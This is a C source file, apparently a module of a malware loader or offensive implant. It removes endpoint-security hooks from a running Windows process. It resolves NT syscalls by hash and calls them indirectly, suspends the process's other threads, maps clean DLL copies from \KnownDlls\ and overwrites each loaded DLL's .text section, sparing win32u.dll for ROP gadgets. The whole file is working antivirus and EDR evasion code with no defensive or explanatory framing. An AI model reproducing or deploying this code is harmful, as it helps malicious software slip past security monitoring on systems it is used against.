#include <Windows.h>

#include "Structs.h"
#include "Common.h"
#include "HellsHall.h"
#include "Debug.h"


// 'WINAPIs' is defined and initialized in 'Inject.c'
extern DIRECT_CALLS WINAPIs;
INDIRECT_SYSCALL NTAPIs = { 0 };



BOOL IntizlizeIndirectSyscalls() {

	if (!InitilizeSysFunc(NtOpenSection_CRC32b, &NTAPIs.NtOpenSection))
		return FALSE;
	if (!InitilizeSysFunc(NtCreateSection_CRC32b, &NTAPIs.NtCreateSection))
		return FALSE;
	if (!InitilizeSysFunc(NtMapViewOfSection_CRC32b, &NTAPIs.NtMapViewOfSection))
		return FALSE;
	if (!InitilizeSysFunc(NtUnmapViewOfSection_CRC32b, &NTAPIs.NtUnmapViewOfSection))
		return FALSE;
	if (!InitilizeSysFunc(NtProtectVirtualMemory_CRC32b, &NTAPIs.NtProtectVirtualMemory))
		return FALSE;
	if (!InitilizeSysFunc(NtOpenThread_CRC32b, &NTAPIs.NtOpenThread))
		return FALSE;
	if (!InitilizeSysFunc(NtSuspendThread_CRC32b, &NTAPIs.NtSuspendThread))
		return FALSE;
	if (!InitilizeSysFunc(NtResumeThread_CRC32b, &NTAPIs.NtResumeThread))
		return FALSE;
	if (!InitilizeSysFunc(NtClose_CRC32b, &NTAPIs.NtClose))
		return FALSE;

	return TRUE;
}

/*
	This function is used to suspend/resume the target process's threads, in an attempt to block it from executing any RW memory (when unhooking)
*/

BOOL SuspendAndResumeLocalThreads(enum THREADS State) {

	// small trick ;)
	DWORD						dwCurrentProcessId		= __readgsqword(0x40); 
	DWORD						dwRunningThread			= __readgsqword(0x48);
	HANDLE						hSnapShot				= INVALID_HANDLE_VALUE,
								hThread					= 0x00;
	NTSTATUS					STATUS					= 0x00;
	THREADENTRY32		        Thr32					= { .dwSize = sizeof(THREADENTRY32) };
	OBJECT_ATTRIBUTES			ObjAttr					= { 0 };
	CLIENT_ID					ClientId				= { 0 };

#ifdef DEBUG
	PRINTA("\n");
#endif // DEBUG

	hSnapShot = WINAPIs.pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTA("[!] CreateToolhelp32Snapshot Failed With Error : %d (Unhook.c:59)\n", GetLastError());
#endif // DEBUG
		WINAPIs.pCloseHandle(hSnapShot);
		return FALSE;
	}

	if (!WINAPIs.pThread32First(hSnapShot, &Thr32)) {
#ifdef DEBUG
		PRINTA("[!] Thread32First Failed With Error : %d (Unhook.c:68)\n", GetLastError());
#endif // DEBUG
		WINAPIs.pCloseHandle(hSnapShot);
		return FALSE;
	}

	do {
		if (Thr32.th32OwnerProcessID == dwCurrentProcessId && Thr32.th32ThreadID != dwRunningThread) {
			
			InitializeObjectAttributes(&ObjAttr, NULL, NULL, NULL, NULL);

			ClientId.UniqueProcess	= (PVOID)Thr32.th32OwnerProcessID;
			ClientId.UniqueThread	= (PVOID)Thr32.th32ThreadID;

			INITIALIZE_SYSCALL(NTAPIs.NtOpenThread);
			if (!NT_SUCCESS((STATUS = HellHall(&hThread, GENERIC_ALL, &ObjAttr, &ClientId)))) {
#ifdef DEBUG
				PRINTA("[!] NtOpenThread Failed With Status : 0x%0.8X (Unhook.c:85)\n", STATUS);
#endif // DEBUG
			}

			if (State == SUSPEND_THREADS) {
#ifdef DEBUG
				PRINTA("\t\t>>> Suspending Thread Of Id : %d ... ", Thr32.th32ThreadID);
#endif // DEBUG

				INITIALIZE_SYSCALL(NTAPIs.NtSuspendThread);
				if (hThread && !NT_SUCCESS(STATUS = HellHall(hThread, NULL))){
#ifdef DEBUG
					PRINTA("[!] NtSuspendThread Failed With Status : 0x%0.8X (Unhook.c:97)\n", STATUS);
#endif // DEBUG
				}
#ifdef DEBUG
				PRINTA("[+] DONE \n");
#endif // DEBUG

			}
			
			if (State == RESUME_THREADS) {
#ifdef DEBUG
				PRINTA("\t\t>>> Resuming Thread Of Id : %d ... ", Thr32.th32ThreadID);
#endif // DEBUG
				INITIALIZE_SYSCALL(NTAPIs.NtResumeThread);
				if (hThread && !NT_SUCCESS(STATUS = HellHall(hThread, NULL))) {
#ifdef DEBUG
					PRINTA("[!] NtResumeThread Failed With Status : 0x%0.8X (Unhook.c:113)\n", STATUS);
#endif // DEBUG
				}
#ifdef DEBUG
				PRINTA("[+] DONE \n");
#endif // DEBUG
			}

			INITIALIZE_SYSCALL(NTAPIs.NtClose);
			if (hThread != NULL)
				HellHall(hThread);

		}

	} while (WINAPIs.pThread32Next(hSnapShot, &Thr32));

#ifdef DEBUG
	PRINTA("\n");
#endif // DEBUG

	WINAPIs.pCloseHandle(hSnapShot);
	return TRUE;
}





LPVOID GetDllFromKnownDll(IN PWSTR DllName) {

	PVOID				pModule					= 0x00;
	HANDLE				hSection				= 0x00;
	NTSTATUS			STATUS					= 0x00;
	SIZE_T				ViewSize				= 0x00;
	UNICODE_STRING		UniStr					= { 0 };
	OBJECT_ATTRIBUTES	ObjAtr					= { 0 };
	WCHAR				FullName	[MAX_PATH]	= { 0 };
	WCHAR				Buf			[MAX_PATH]	= { L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's', L'\\' };

	_strcpy(FullName, Buf);
	_strcat(FullName, DllName);
	_RtlInitUnicodeString(&UniStr, FullName);
	InitializeObjectAttributes(&ObjAtr, &UniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	INITIALIZE_SYSCALL(NTAPIs.NtOpenSection);
	if (!NT_SUCCESS((STATUS = HellHall(&hSection, SECTION_MAP_READ, &ObjAtr)))) {
#ifdef DEBUG
		PRINTW(L"[!] NtOpenSection Failed For \"%s\" With Status : 0x%0.8X [THAT'S PROB OK]\n", FullName, STATUS);
#endif // DEBUG
		return NULL;
	}

	INITIALIZE_SYSCALL(NTAPIs.NtMapViewOfSection);
	if (!NT_SUCCESS((STATUS = HellHall(hSection, NtCurrentProcess(), &pModule, NULL, NULL, NULL, &ViewSize, ViewShare, NULL, PAGE_READONLY)))) {
#ifdef DEBUG
		PRINTW(L"[!] NtMapViewOfSection Failed For \"%s\" With Status : 0x%0.8X (Unhook.c:168)\n", FullName, STATUS);
#endif // DEBUG
		return NULL;
	}

	return pModule;
}



BOOL RefreshAllDlls() {

#if _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
	PPEB pPeb = NULL;
#endif

	if (pPeb == NULL || (pPeb != NULL && pPeb->OSMajorVersion != 0xA)) {
		return FALSE;
	}

	PLIST_ENTRY		Head					= NULL,
					Next					= NULL;
	NTSTATUS		STATUS					= NULL;
	LPVOID			KnownDllDllModule		= NULL,
					CurrentDllModule		= NULL;
	PVOID			pLocalTxtAddress		= NULL,
					pRemoteTxtAddress		= NULL;
	SIZE_T			sLocalTxtSize			= NULL;
	DWORD			dwOldPermission			= NULL;


	Head = &pPeb->LoaderData->InMemoryOrderModuleList;
	// skipping the local image, because we know its not in \KnownDlls\ folder 
	Next = Head->Flink->Flink;

	// suspending all local threads, to prevent executing RW memory
	if (!SuspendAndResumeLocalThreads(SUSPEND_THREADS))
		return FALSE;

	// loop through all dlls:
	while (Next != Head) {

		// getting the dll name:
		PLDR_DATA_TABLE_ENTRY	pLdrData = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Next - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
		PUNICODE_STRING			DllName = (PUNICODE_STRING)((PBYTE)&pLdrData->FullDllName + sizeof(UNICODE_STRING));
		
		// if not win32u.dll, bcz our rop gadgets are in 'win32u.dll' (and we need to keep it RX)
		if (HASHb(DllName->Buffer) != win32udll_CRC32b && HASHb(DllName->Buffer) != WIN32UDLL_CRC32b) {
			// getting the dll's handle from \KnownDlls\ : in case it returned null, that's ok, cz the dll may not be in KnownDlls after all ...
			KnownDllDllModule = GetDllFromKnownDll(DllName->Buffer);
			CurrentDllModule = (LPVOID)(pLdrData->DllBase);

			// if we had the dll mapped with a valid address from KnownDlls:
			if (KnownDllDllModule != NULL && CurrentDllModule != NULL) {
				// get the dos & nt headers of our local dll
				PIMAGE_DOS_HEADER CurrentDllImgDosHdr = (PIMAGE_DOS_HEADER)CurrentDllModule;
				if (CurrentDllImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
					return FALSE;
				}
				PIMAGE_NT_HEADERS CurrentDllImgNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)CurrentDllModule + CurrentDllImgDosHdr->e_lfanew);
				if (CurrentDllImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
					return FALSE;
				}
				// get the address of the module's txt section & its size & calculate the knowndll txt section address
				for (int i = 0; i < CurrentDllImgNtHdr->FileHeader.NumberOfSections; i++) {
					PIMAGE_SECTION_HEADER pImgSec = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(CurrentDllImgNtHdr) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
					if ((*(ULONG*)pImgSec->Name | 0x20202020) == 'xet.') {
						sLocalTxtSize = pImgSec->Misc.VirtualSize;
						pLocalTxtAddress = (PVOID)((ULONG_PTR)CurrentDllModule + pImgSec->VirtualAddress);
						pRemoteTxtAddress = (PVOID)((ULONG_PTR)KnownDllDllModule + pImgSec->VirtualAddress);
					}
				}
				// small check here ...
				if (sLocalTxtSize == NULL || pLocalTxtAddress == NULL || pRemoteTxtAddress == NULL) {
					return FALSE;
				}

				// if both have the same bytes, its a valid text section
				if (*(ULONG_PTR*)pLocalTxtAddress != *(ULONG_PTR*)pRemoteTxtAddress)
					return FALSE;

				PVOID		 pAddress	= pLocalTxtAddress;
				SIZE_T		 sSize		= sLocalTxtSize;

#ifdef DEBUG
				PRINTW(L"\n[i] Replacing .txt of %s ... ", DllName->Buffer);
				PRINTA("\n\t> pLocalTxtAddress : 0x%p \n\t> pRemoteTxtAddress : 0x%p \n", pLocalTxtAddress, pRemoteTxtAddress);

#endif // DEBUG
				INITIALIZE_SYSCALL(NTAPIs.NtProtectVirtualMemory);
				if (!NT_SUCCESS((STATUS = HellHall((HANDLE)-1, &pAddress, &sSize, PAGE_READWRITE, &dwOldPermission)))) {
#ifdef DEBUG
					PRINTA("[!] NtProtectVirtualMemory [1] Failed With Status : 0x%0.8X (Unhook.c:262)\n", STATUS);
#endif // DEBUG
					return FALSE;
				}

				_memcpy(pLocalTxtAddress, pRemoteTxtAddress, sLocalTxtSize);

				INITIALIZE_SYSCALL(NTAPIs.NtProtectVirtualMemory);
				if (!NT_SUCCESS((STATUS = HellHall((HANDLE)-1, &pAddress, &sSize, dwOldPermission, &dwOldPermission)))) {
#ifdef DEBUG
					PRINTA("[!] NtProtectVirtualMemory [2] Failed With Status : 0x%0.8X (Unhook.c:272)\n", STATUS);
#endif // DEBUG
					return FALSE;
				}

				// unmap the KnownDlls dll
				INITIALIZE_SYSCALL(NTAPIs.NtUnmapViewOfSection);
				if (!NT_SUCCESS((STATUS = HellHall(NtCurrentProcess(), KnownDllDllModule)))) {
#ifdef DEBUG
					PRINTA("[!] NtUnmapViewOfSection Failed With Status : 0x%0.8X (Unhook.c:282)\n", STATUS);
#endif // DEBUG
					return FALSE;
				}

#ifdef DEBUG
				PRINTA("[+] DONE \n");
#endif // DEBUG

			}

		}

		// continue to the next dll ...
		Next = Next->Flink;
	}

	// resuming all local threads
	if (!SuspendAndResumeLocalThreads(RESUME_THREADS))
		return FALSE;


	return TRUE;
}


